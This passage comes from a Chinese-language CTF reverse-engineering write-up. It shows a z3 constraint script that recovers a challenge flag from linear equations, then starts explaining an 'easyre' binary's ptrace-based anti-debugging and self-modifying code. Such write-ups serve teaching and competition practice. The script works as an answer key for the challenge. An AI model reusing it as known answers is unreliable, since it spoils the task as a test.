class="line">s.add(v5==<span class="number">0</span>)</span><br><span class="line">v5 = - <span class="number">151496</span> * flag[<span class="number">1</span>]+ <span class="number">204740</span> * flag[<span class="number">0</span>]+ <span class="number">80143</span> * flag[<span class="number">2</span>]- <span class="number">12295783</span></span><br><span class="line">s.add(v5==<span class="number">0</span>)</span><br><span class="line">v5 = <span class="number">241935</span> * flag[<span class="number">1</span>]+ <span class="number">124128</span> * flag[<span class="number">0</span>]- <span class="number">38790036</span>+ <span class="number">273221</span> * flag[<span class="number">0</span>]- <span class="number">27868542</span></span><br><span class="line">s.add(v5==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v6 = -<span class="number">279656</span> * flag[<span class="number">2</span>]- <span class="number">199574</span> * flag[<span class="number">1</span>]- <span class="number">258130</span> * flag[<span class="number">8</span>]- <span class="number">200399</span> * flag[<span class="number">3</span>]- <span class="number">173903</span> * flag[<span class="number">7</span>]+ <span class="number">175816</span> * flag[<span class="number">0</span>]- <span class="number">234569</span> * flag[<span class="number">6</span>]- <span class="number">108273</span> * flag[<span class="number">4</span>]- <span class="number">222957</span> * flag[<span class="number">5</span>]+ <span class="number">128244179</span></span><br><span class="line">s.add(v6==<span class="number">0</span>)</span><br><span class="line">v6 = - <span class="number">81541</span> * flag[<span class="number">1</span>]- <span class="number">268763</span> * flag[<span class="number">0</span>]+ <span class="number">219073</span> * flag[<span class="number">3</span>]+ <span class="number">34782</span> * flag[<span class="number">6</span>]+ <span class="number">21153</span> * flag[<span class="number">5</span>]+ <span class="number">173005</span> * flag[<span class="number">7</span>]+ <span class="number">76285</span> * flag[<span class="number">4</span>]+ <span class="number">32825</span> * flag[<span class="number">2</span>]- <span class="number">13874925</span></span><br><span class="line">s.add(v6==<span class="number">0</span>)</span><br><span class="line">v6 = <span class="number">85214</span> * flag[<span class="number">2</span>]- <span class="number">268299</span> * flag[<span class="number">3</span>]- <span class="number">230981</span> * flag[<span class="number">1</span>]+ <span class="number">290772</span> * flag[<span class="number">5</span>]- <span class="number">74394</span> * flag[<span class="number">4</span>]+ <span class="number">28044</span> * flag[<span class="number">6</span>]- <span class="number">242995</span> * flag[<span class="number">0</span>]+ <span class="number">50871139</span></span><br><span class="line">s.add(v6==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v7 = -<span class="number">208564</span> * flag[<span class="number">0</span>] + <span class="number">81934</span> * flag[<span class="number">9</span>] - <span class="number">106641</span> * flag[<span class="number">7</span>] + <span class="number">198477</span> * flag[<span class="number">2</span>] + <span class="number">154505</span> * flag[<span class="number">1</span>] + <span class="number">48440</span> * flag[<span class="number">5</span>] - <span class="number">149004</span> * flag[<span class="number">3</span>] - <span class="number">108909</span> * flag[<span class="number">4</span>] - <span class="number">51714</span> * flag[<span class="number">10</span>] - <span class="number">296420</span> * flag[<span class="number">8</span>] + <span class="number">263021</span> * flag[<span class="number">6</span>] + <span class="number">688726</span> </span><br><span class="line">s.add(v7==<span class="number">0</span>)</span><br><span class="line">v7 = - <span class="number">131130</span> * flag[<span class="number">2</span>] + <span class="number">224265</span> * flag[<span class="number">3</span>] + <span class="number">230702</span> * flag[<span class="number">0</span>] - <span class="number">176285</span> * flag[<span class="number">7</span>] - <span class="number">274778</span> * flag[<span class="number">4</span>] + <span class="number">103848</span> * flag[<span class="number">8</span>] - <span class="number">136039</span> * flag[<span class="number">9</span>] - <span class="number">241151</span> * flag[<span class="number">5</span>] + <span class="number">15542</span> * flag[<span class="number">6</span>] - <span class="number">17521</span> * flag[<span class="number">1</span>] + <span class="number">41644083</span></span><br><span class="line">s.add(v7==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v8 = <span class="number">195056</span> * flag[<span class="number">4</span>]- <span class="number">15717</span> * flag[<span class="number">9</span>]- <span class="number">180214</span> * flag[<span class="number">6</span>]- <span class="number">114427</span> * flag[<span class="number">5</span>]+ <span class="number">277782</span> * flag[<span class="number">7</span>]+ <span class="number">261379</span> * flag[<span class="number">8</span>]- <span class="number">225266</span> * flag[<span class="number">2</span>]+ <span class="number">107609</span> * flag[<span class="number">0</span>]+ <span class="number">259792</span> * flag[<span class="number">3</span>]+ <span class="number">270563</span> * flag[<span class="number">11</span>]+ <span class="number">205124</span> * flag[<span class="number">1</span>]+ <span class="number">138334</span> * flag[<span class="number">10</span>]+ <span class="number">103474</span> * flag[<span class="number">12</span>]- <span class="number">117027475</span></span><br><span class="line">s.add(v8==<span class="number">0</span>)</span><br><span class="line">v8 = <span class="number">189573</span> * flag[<span class="number">8</span>]+ <span class="number">64393</span> * flag[<span class="number">6</span>]+ <span class="number">231137</span> * flag[<span class="number">1</span>]+ <span class="number">145315</span> * flag[<span class="number">4</span>]- <span class="number">53938</span> * flag[<span class="number">10</span>]- <span class="number">291345</span> * flag[<span class="number">5</span>]+ <span class="number">216413</span> * flag[<span class="number">3</span>]- <span class="number">204681</span> * flag[<span class="number">0</span>]- <span class="number">65519</span> * flag[<span class="number">9</span>]- <span class="number">262826</span> * flag[<span class="number">2</span>]+ <span class="number">187002</span> * flag[<span class="number">7</span>]+ <span class="number">271732</span> * flag[<span class="number">11</span>]- <span class="number">38663722</span></span><br><span class="line">s.add(v8==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v9 = <span class="number">15645</span> * flag[<span class="number">13</span>] + <span class="number">276267</span> * flag[<span class="number">12</span>] + <span class="number">31190</span> * flag[<span class="number">5</span>] - <span class="number">244002</span> * flag[<span class="number">2</span>] + <span class="number">81415</span> * flag[<span class="number">3</span>] - <span class="number">22940</span> * flag[<span class="number">10</span>] - <span class="number">126076</span> * flag[<span class="number">7</span>] + <span class="number">8932</span> * flag[<span class="number">8</span>] + <span class="number">112153</span> * flag[<span class="number">4</span>] + <span class="number">194218</span> * flag[<span class="number">11</span>] + <span class="number">197656</span> * flag[<span class="number">9</span>] - <span class="number">204463</span> * flag[<span class="number">0</span>] - <span class="number">219500</span> * flag[<span class="number">1</span>] + <span class="number">19777</span> * flag[<span class="number">6</span>] - <span class="number">24531260</span></span><br><span class="line">s.add(v9==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v10 = <span class="number">279969</span> * flag[<span class="number">8</span>]- <span class="number">123977</span> * flag[<span class="number">4</span>]+ <span class="number">162094</span> * flag[<span class="number">0</span>]- <span class="number">215769</span> * flag[<span class="number">1</span>]- <span class="number">18878</span> * flag[<span class="number">14</span>]- <span class="number">80292</span> * flag[<span class="number">11</span>]- <span class="number">237675</span> * flag[<span class="number">5</span>]- <span class="number">222121</span> * flag[<span class="number">6</span>]+ <span class="number">269381</span> * flag[<span class="number">12</span>]+ <span class="number">153934</span> * flag[<span class="number">13</span>]- <span class="number">165380</span> * flag[<span class="number">10</span>]- <span class="number">157137</span> * flag[<span class="number">2</span>]- <span class="number">186748</span> * flag[<span class="number">3</span>]+ <span class="number">170756</span> * flag[<span class="number">7</span>]- <span class="number">186932</span> * flag[<span class="number">9</span>]+ <span class="number">87264470</span></span><br><span class="line">s.add(v10==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v11 = -<span class="number">87190</span> * flag[<span class="number">2</span>]- <span class="number">74836</span> * flag[<span class="number">1</span>]+ <span class="number">16892</span> * flag[<span class="number">9</span>]- <span class="number">185781</span> * flag[<span class="number">8</span>]- <span class="number">12726</span> * flag[<span class="number">7</span>]+ <span class="number">85022</span> * flag[<span class="number">12</span>]+ <span class="number">232989</span> * flag[<span class="number">10</span>]+ <span class="number">68516</span> * flag[<span class="number">0</span>]- <span class="number">120254</span> * flag[<span class="number">6</span>]- <span class="number">204892</span> * flag[<span class="number">5</span>]- <span class="number">65901</span> * flag[<span class="number">4</span>]- <span class="number">201087</span> * flag[<span class="number">13</span>]+ <span class="number">158612</span> * flag[<span class="number">11</span>]- <span class="number">49445</span> * flag[<span class="number">3</span>]- <span class="number">181860</span> * flag[<span class="number">14</span>]- <span class="number">111015</span> * flag[<span class="number">15</span>]+ <span class="number">43646834</span></span><br><span class="line">s.add(v11==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v12 = -<span class="number">170184</span> * flag[<span class="number">3</span>] - <span class="number">137671</span> * flag[<span class="number">4</span>] - <span class="number">85374</span> * flag[<span class="number">9</span>] - <span class="number">73658</span> * flag[<span class="number">11</span>] + <span class="number">230891</span> * flag[<span class="number">13</span>] + <span class="number">54346</span> * flag[<span class="number">15</span>] - <span class="number">280694</span> * flag[<span class="number">0</span>] + <span class="number">60411</span> * flag[<span class="number">2</span>] + <span class="number">27171</span> * flag[<span class="number">7</span>] - <span class="number">50618</span> * flag[<span class="number">6</span>] + <span class="number">11843</span> * flag[<span class="number">10</span>] + <span class="number">131778</span> * flag[<span class="number">5</span>] + <span class="number">13956</span> * flag[<span class="number">8</span>] - <span class="number">42562</span> * flag[<span class="number">12</span>] - <span class="number">19972</span> * flag[<span class="number">1</span>] - <span class="number">145797</span> * flag[<span class="number">14</span>] - <span class="number">58717</span> * flag[<span class="number">16</span>] + <span class="number">74613584</span></span><br><span class="line">s.add(v12==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v13 = <span class="number">242475</span> * flag[<span class="number">16</span>]- <span class="number">234385</span> * flag[<span class="number">0</span>]+ <span class="number">124653</span> * flag[<span class="number">2</span>]- <span class="number">287929</span> * flag[<span class="number">13</span>]- <span class="number">190916</span> * flag[<span class="number">12</span>]- <span class="number">277578</span> * flag[<span class="number">11</span>]+ <span class="number">39</span> * flag[<span class="number">8</span>]- <span class="number">41625</span> * flag[<span class="number">6</span>]+ <span class="number">67262</span> * flag[<span class="number">5</span>]- <span class="number">250144</span> * flag[<span class="number">9</span>]- <span class="number">70886</span> * flag[<span class="number">10</span>]- <span class="number">223492</span> * flag[<span class="number">15</span>]- <span class="number">179651</span> * flag[<span class="number">7</span>]+ <span class="number">206538</span> * flag[<span class="number">17</span>]+ <span class="number">161965</span> * flag[<span class="number">3</span>]- <span class="number">146258</span> * flag[<span class="number">4</span>]+ <span class="number">167068</span> * flag[<span class="number">1</span>]+ <span class="number">196330</span> * flag[<span class="number">14</span>]+ <span class="number">76353817</span></span><br><span class="line">s.add(v13==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v14 = <span class="number">29700</span> * flag[<span class="number">18</span>]- <span class="number">60542</span> * flag[<span class="number">5</span>]+ <span class="number">274107</span> * flag[<span class="number">11</span>]+ <span class="number">154914</span> * flag[<span class="number">13</span>]- <span class="number">143185</span> * flag[<span class="number">12</span>]+ <span class="number">167424</span> * flag[<span class="number">2</span>]+ <span class="number">137439</span> * flag[<span class="number">8</span>]- <span class="number">186151</span> * flag[<span class="number">10</span>]- <span class="number">77157</span> * flag[<span class="number">9</span>]- <span class="number">233090</span> * flag[<span class="number">6</span>]- <span class="number">27400</span> * flag[<span class="number">7</span>]- <span class="number">76557</span> * flag[<span class="number">15</span>]- <span class="number">108002</span> * flag[<span class="number">17</span>]+ <span class="number">103161</span> * flag[<span class="number">14</span>]- <span class="number">133956</span> * flag[<span class="number">1</span>]- <span class="number">219502</span> * flag[<span class="number">4</span>]- <span class="number">202897</span> * flag[<span class="number">0</span>]- <span class="number">250957</span> * flag[<span class="number">3</span>]- <span class="number">119297</span> * flag[<span class="number">16</span>]+ <span class="number">100812197</span></span><br><span class="line">s.add(v14==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v15 = -<span class="number">171971</span> * flag[<span class="number">9</span>]+ <span class="number">38740</span> * flag[<span class="number">4</span>]+ -<span class="number">31661</span> * flag[<span class="number">10</span>]+ -<span class="number">194653</span> * flag[<span class="number">18</span>]+ -<span class="number">295910</span> * flag[<span class="number">16</span>]+ <span class="number">136489</span> * flag[<span class="number">12</span>]+ <span class="number">212619</span> * flag[<span class="number">17</span>]+ <span class="number">165592</span> * flag[<span class="number">11</span>]+ <span class="number">211791</span> * flag[<span class="number">1</span>]+ <span class="number">156909</span> * flag[<span class="number">2</span>]+ -<span class="number">232187</span> * flag[<span class="number">8</span>]+ -<span class="number">73709</span> * flag[<span class="number">7</span>]+ <span class="number">79735</span> * flag[<span class="number">14</span>]+ <span class="number">184882</span> * flag[<span class="number">13</span>]+ <span class="number">111105</span> * flag[<span class="number">6</span>]+ <span class="number">148840</span> * flag[<span class="number">3</span>]+ -<span class="number">35774</span> * flag[<span class="number">19</span>]+ -<span class="number">275711</span> * flag[<span class="number">0</span>] + <span class="number">135265</span> * flag[<span class="number">5</span>] - <span class="number">141221</span> * flag[<span class="number">15</span>] - <span class="number">39117122</span></span><br><span class="line">s.add(v15==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v16 = -<span class="number">186514</span> * flag[<span class="number">17</span>]+ -<span class="number">7791</span> * flag[<span class="number">2</span>]+ <span class="number">276755</span> * flag[<span class="number">11</span>]+ -<span class="number">294815</span> * flag[<span class="number">14</span>]+ -<span class="number">238763</span> * flag[<span class="number">15</span>]+ -<span class="number">146099</span> * flag[<span class="number">5</span>]+ <span class="number">184977</span> * flag[<span class="number">16</span>]+ <span class="number">178413</span> * flag[<span class="number">1</span>]+ <span class="number">287303</span> * flag[<span class="number">3</span>]+ -<span class="number">71946</span> * flag[<span class="number">10</span>]+ -<span class="number">73771</span> * flag[<span class="number">9</span>]+ -<span class="number">129032</span> * flag[<span class="number">18</span>]+ <span class="number">200202</span> * flag[<span class="number">20</span>]+ -<span class="number">150509</span> * flag[<span class="number">6</span>]+ -<span class="number">156625</span> * flag[<span class="number">13</span>]+ <span class="number">14093</span> * flag[<span class="number">7</span>]+ <span class="number">192584</span> * flag[<span class="number">12</span>]- <span class="number">122770</span> * flag[<span class="number">0</span>]- <span class="number">255494</span> * flag[<span class="number">8</span>] + <span class="number">65</span> * flag[<span class="number">4</span>] - <span class="number">108479</span> * flag[<span class="number">19</span>] + <span class="number">13521895</span></span><br><span class="line">s.add(v16==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v17 = <span class="number">210978</span> * flag[<span class="number">7</span>]+ <span class="number">300336</span> * flag[<span class="number">10</span>]+ <span class="number">207254</span> * flag[<span class="number">15</span>]+ <span class="number">216206</span> * flag[<span class="number">5</span>]+ -<span class="number">63529</span> * flag[<span class="number">0</span>]+ -<span class="number">274903</span> * flag[<span class="number">11</span>]+ -<span class="number">10750</span> * flag[<span class="number">14</span>]+ <span class="number">25008</span> * flag[<span class="number">4</span>]+ -<span class="number">100942</span> * flag[<span class="number">19</span>]+ -<span class="number">104857</span> * flag[<span class="number">2</span>]+ <span class="number">266501</span> * flag[<span class="number">8</span>]+ <span class="number">229070</span> * flag[<span class="number">17</span>]+ -<span class="number">234559</span> * flag[<span class="number">16</span>]+ <span class="number">298459</span> * flag[<span class="number">3</span>]+ -<span class="number">172052</span> * flag[<span class="number">6</span>]+ -<span class="number">98938</span> * flag[<span class="number">12</span>]+ <span class="number">66155</span> * flag[<span class="number">13</span>]+ -<span class="number">84761</span> * flag[<span class="number">1</span>]+ -<span class="number">283508</span> * flag[<span class="number">18</span>]+ <span class="number">288577</span> * flag[<span class="number">21</span>] - <span class="number">75407</span> * flag[<span class="number">20</span>] - <span class="number">204447</span> * flag[<span class="number">9</span>] + <span class="number">4351595</span></span><br><span class="line">s.add(v17==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v18 = -<span class="number">201846</span> * flag[<span class="number">14</span>]+ <span class="number">272550</span> * flag[<span class="number">20</span>]+ <span class="number">60398</span> * flag[<span class="number">6</span>]+ <span class="number">45580</span> * flag[<span class="number">7</span>]+ <span class="number">195108</span> * flag[<span class="number">11</span>]+ <span class="number">38596</span> * flag[<span class="number">0</span>]+ <span class="number">220445</span> * flag[<span class="number">18</span>]+ -<span class="number">190873</span> * flag[<span class="number">15</span>]+ <span class="number">103477</span> * flag[<span class="number">9</span>]+ <span class="number">118842</span> * flag[<span class="number">19</span>]+ <span class="number">206336</span> * flag[<span class="number">10</span>]+ -<span class="number">249940</span> * flag[<span class="number">17</span>]+ -<span class="number">48084</span> * flag[<span class="number">21</span>]+ <span class="number">104901</span> * flag[<span class="number">5</span>]+ -<span class="number">48576</span> * flag[<span class="number">4</span>]+ <span class="number">287104</span> * flag[<span class="number">16</span>]+ -<span class="number">286686</span> * flag[<span class="number">1</span>]+ -<span class="number">30253</span> * flag[<span class="number">22</span>]+ <span class="number">121183</span> * flag[<span class="number">3</span>]+ <span class="number">90967</span> * flag[<span class="number">2</span>]+ -<span class="number">195519</span> * flag[<span class="number">12</span>] - <span class="number">129304</span> * flag[<span class="number">8</span>] + <span class="number">141188</span> * flag[<span class="number">13</span>] - <span class="number">56642147</span></span><br><span class="line">s.add(v18==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v19 = <span class="number">110609</span> * flag[<span class="number">4</span>]+ <span class="number">5913</span> * flag[<span class="number">21</span>]+ -<span class="number">197578</span> * flag[<span class="number">7</span>]+ <span class="number">45127</span> * flag[<span class="number">18</span>]+ <span class="number">282426</span> * flag[<span class="number">13</span>]+ -<span class="number">71019</span> * flag[<span class="number">16</span>]+ -<span class="number">6980</span> * flag[<span class="number">11</span>]+ <span class="number">208216</span> * flag[<span class="number">15</span>]+ -<span class="number">13544</span> * flag[<span class="number">20</span>]+ <span class="number">17852</span> * flag[<span class="number">8</span>]+ <span class="number">167833</span> * flag[<span class="number">12</span>]+ <span class="number">145568</span> * flag[<span class="number">17</span>]+ <span class="number">3610</span> * flag[<span class="number">19</span>]+ <span class="number">91985</span> * flag[<span class="number">1</span>]+ -<span class="number">267402</span> * flag[<span class="number">5</span>]+ -<span class="number">32355</span> * flag[<span class="number">14</span>]+ -<span class="number">197823</span> * flag[<span class="number">23</span>]+ <span class="number">135525</span> * flag[<span class="number">2</span>]+ -<span class="number">229424</span> * flag[<span class="number">22</span>]+ <span class="number">38093</span> * flag[<span class="number">10</span>]+ <span class="number">50167</span> * flag[<span class="number">6</span>]+ <span class="number">118713</span> * flag[<span class="number">9</span>] + <span class="number">123874</span> * flag[<span class="number">0</span>] - <span class="number">89499</span> * flag[<span class="number">3</span>] - <span class="number">43090537</span></span><br><span class="line">s.add(v19==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v1 = -<span class="number">164755</span> * flag[<span class="number">9</span>] + <span class="number">175470</span> * flag[<span class="number">8</span>] - <span class="number">28660</span> * flag[<span class="number">1</span>] + <span class="number">7217</span> * flag[<span class="number">11</span>] - <span class="number">295102</span> * flag[<span class="number">4</span>] - <span class="number">28531</span> * flag[<span class="number">19</span>] - <span class="number">106265</span> * flag[<span class="number">25</span>] - <span class="number">92750</span> * flag[<span class="number">10</span>] + <span class="number">16738</span> * flag[<span class="number">21</span>] - <span class="number">231714</span> * flag[<span class="number">6</span>] + <span class="number">172042</span> * flag[<span class="number">24</span>] - <span class="number">215890</span> * flag[<span class="number">17</span>] + <span class="number">199697</span> * flag[<span class="number">12</span>] - <span class="number">84235</span> * flag[<span class="number">7</span>] + <span class="number">44614</span> * flag[<span class="number">13</span>] + <span class="number">75104</span> * flag[<span class="number">5</span>] - <span class="number">195843</span> * flag[<span class="number">0</span>] - <span class="number">15784</span> * flag[<span class="number">14</span>] - <span class="number">131950</span> * flag[<span class="number">15</span>] - <span class="number">268167</span> * flag[<span class="number">16</span>] - <span class="number">197565</span> * flag[<span class="number">20</span>] + <span class="number">24340</span> * flag[<span class="number">23</span>] + <span class="number">105130</span> * flag[<span class="number">2</span>] - <span class="number">79750</span> * flag[<span class="number">22</span>] - <span class="number">264668</span> * flag[<span class="number">3</span>] + <span class="number">50329</span> * flag[<span class="number">18</span>] + <span class="number">137774797</span></span><br><span class="line">s.add(v1==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v20 = <span class="number">62119</span> * flag[<span class="number">17</span>]- <span class="number">17215</span> * flag[<span class="number">24</span>]+ <span class="number">289621</span> * flag[<span class="number">18</span>]+ <span class="number">53006</span> * flag[<span class="number">20</span>]+ <span class="number">95969</span> * flag[<span class="number">11</span>]+ <span class="number">202404</span> * flag[<span class="number">0</span>]+ <span class="number">247060</span> * flag[<span class="number">21</span>]+ <span class="number">144211</span> * flag[<span class="number">19</span>]+ <span class="number">280106</span> * flag[<span class="number">7</span>]- <span class="number">126431</span> * flag[<span class="number">10</span>]- <span class="number">226837</span> * flag[<span class="number">12</span>]+ <span class="number">10463</span> * flag[<span class="number">23</span>]+ <span class="number">121257</span> * flag[<span class="number">13</span>]- <span class="number">84190</span> * flag[<span class="number">9</span>]+ <span class="number">88917</span> * flag[<span class="number">1</span>]+ <span class="number">15453</span> * flag[<span class="number">14</span>]+ <span class="number">271442</span> * flag[<span class="number">4</span>]+ <span class="number">110851</span> * flag[<span class="number">3</span>]- <span class="number">231422</span> * flag[<span class="number">5</span>]+ <span class="number">176741</span> * flag[<span class="number">22</span>]+ <span class="number">266134</span> * flag[<span class="number">2</span>]- <span class="number">197327</span> * flag[<span class="number">6</span>]- <span class="number">55225</span> * flag[<span class="number">8</span>] - <span class="number">265465</span> * flag[<span class="number">15</span>] + <span class="number">119612</span> * flag[<span class="number">16</span>] - <span class="number">98514358</span></span><br><span class="line">s.add(v20==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v2 = <span class="number">151924</span> * flag[<span class="number">25</span>] - <span class="number">265311</span> * flag[<span class="number">6</span>] + <span class="number">107604</span> * flag[<span class="number">11</span>] - <span class="number">47851</span> * flag[<span class="number">24</span>] + <span class="number">227178</span> * flag[<span class="number">13</span>] - <span class="number">162699</span> * flag[<span class="number">2</span>] + <span class="number">2171</span> * flag[<span class="number">20</span>] + <span class="number">211070</span> * flag[<span class="number">23</span>] + <span class="number">94815</span> * flag[<span class="number">22</span>] + <span class="number">124760</span> * flag[<span class="number">16</span>] + <span class="number">41462</span> * flag[<span class="number">19</span>] - <span class="number">277022</span> * flag[<span class="number">15</span>] - <span class="number">62501</span> * flag[<span class="number">26</span>] - <span class="number">17727</span> * flag[<span class="number">14</span>] - <span class="number">257908</span> * flag[<span class="number">4</span>] - <span class="number">175112</span> * flag[<span class="number">21</span>] + <span class="number">8972</span> * flag[<span class="number">10</span>] - <span class="number">71801</span> * flag[<span class="number">8</span>] - <span class="number">114724</span> * flag[<span class="number">5</span>] - <span class="number">252898</span> * flag[<span class="number">9</span>] + <span class="number">161457</span> * flag[<span class="number">1</span>] - <span class="number">64461</span> * flag[<span class="number">0</span>] - <span class="number">111493</span> * flag[<span class="number">18</span>] + <span class="number">200145</span> * flag[<span class="number">17</span>] - <span class="number">290075</span> * flag[<span class="number">3</span>] + <span class="number">158466</span> * flag[<span class="number">12</span>]</span><br><span class="line">v21 = v2 - <span class="number">275262</span> * flag[<span class="number">7</span>] + <span class="number">86899519</span></span><br><span class="line">s.add(v21==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">v3 = <span class="number">142850</span> * flag[<span class="number">18</span>]- <span class="number">166704</span> * flag[<span class="number">1</span>]+ <span class="number">284852</span> * flag[<span class="number">22</span>]+ <span class="number">248972</span> * flag[<span class="number">7</span>]- <span class="number">76200</span> * flag[<span class="number">17</span>]+ <span class="number">261708</span> * flag[<span class="number">19</span>]+ <span class="number">91911</span> * flag[<span class="number">24</span>]+ <span class="number">22347</span> * flag[<span class="number">3</span>]+ <span class="number">76006</span> * flag[<span class="number">21</span>]+ <span class="number">256511</span> * flag[<span class="number">6</span>]- <span class="number">100052</span> * flag[<span class="number">14</span>]- <span class="number">115830</span> * flag[<span class="number">2</span>]- <span class="number">93202</span> * flag[<span class="number">23</span>]+ <span class="number">248858</span> * flag[<span class="number">12</span>]- <span class="number">262669</span> * flag[<span class="number">10</span>]+ <span class="number">67895</span> * flag[<span class="number">5</span>]- <span class="number">111771</span> * flag[<span class="number">8</span>]- <span class="number">132193</span> * flag[<span class="number">11</span>]- <span class="number">141512</span> * flag[<span class="number">13</span>]+ <span class="number">139406</span> * flag[<span class="number">27</span>]+ <span class="number">109646</span> * flag[<span class="number">16</span>]- <span class="number">286309</span> * flag[<span class="number">9</span>]+ <span class="number">175476</span> * flag[<span class="number">15</span>] + <span class="number">138067</span> * flag[<span class="number">20</span>] + <span class="number">192825</span> * flag[<span class="number">25</span>]</span><br><span class="line">s.add(flag[<span class="number">0</span>] == <span class="number">102</span>)</span><br><span class="line">s.add(flag[<span class="number">1</span>] == <span class="number">108</span>)</span><br><span class="line">s.add(flag[<span class="number">2</span>] == <span class="number">97</span>)</span><br><span class="line">s.add(flag[<span class="number">3</span>] == <span class="number">103</span>)</span><br><span class="line">s.add(flag[<span class="number">4</span>] == <span class="number">123</span>)</span><br><span class="line">s.add(flag[<span class="number">27</span>] == <span class="number">125</span>)</span><br><span class="line"></span><br><span class="line">s.add(<span class="number">199577</span> * flag[<span class="number">0</span>] - <span class="number">63091</span> * flag[<span class="number">4</span>] + v3 - <span class="number">285207</span> * flag[<span class="number">26</span>] - <span class="number">58820340</span> + v21 == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line">mod = s.model()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(mod[x].as_long()) <span class="keyword">for</span> x <span class="keyword">in</span> flag]))</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>首先来卡一下main函数  finger识别一下函数</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071417780.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071417780.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>fork函数在主进程返回的是子进程的PID，在子进程返回的是0，这里生成一个re3的文件</p><p><a href="https://www.cnblogs.com/heixiang/p/10988992.html">ptrace函数深入分析 - 黑箱 - 博客园 (cnblogs.com)</a></p><p>这里的ptrace比较重要代表不同的类型</p><p><img src="https://ppppz.net/2022/08/03/QWB2022-GameMaster-EasyRe/image-20220803235602533.png" class="lazyload" data-srcset="https://ppppz.net/2022/08/03/QWB2022-GameMaster-EasyRe/image-20220803235602533.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220803235602533"></p><p>光标在第一个参数上按M，搜索 ptrace，就可以得到相应的参数。</p><p>进入401f2f函数</p><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220807145058986.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220807145058986.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220807145058986"></p><p>4017e5函数，有一大串数据</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071520848.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071520848.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071522380.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071522380.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>似乎是对子进程进行了一些操作，我们去看看之前的re3文件</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071436411.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071436411.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>Int setjmp(jmp_buf  env);</p><p>​       返回值：若直接调用则返回0，若从longjmp调用返回则返回非0值的longjmp中的val值</p><p>Void longjmp(jmp_buf env,int val);</p><p>​        调用此函数则返回到语句setjmp所在的地方，其中env 就是setjmp中的 env，而val 则是使setjmp的返回值变为val。</p><p>这里的loc_21F9是重要逻辑，跟进，看到一个int3，这里发出中断信号，等待主处理进程，然后主进程判断异常类型（这就是后面的值），然后执行smc操作，也照应了之前的wait函数。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071437881.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071437881.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>下面我们再回到主进程分析一下smc</p><p>带参数启动调试。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071523459.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071523459.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>主要smc逻辑</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071546847.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071546847.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>我们运用断点把数据提取出来</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071551653.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071551653.png" 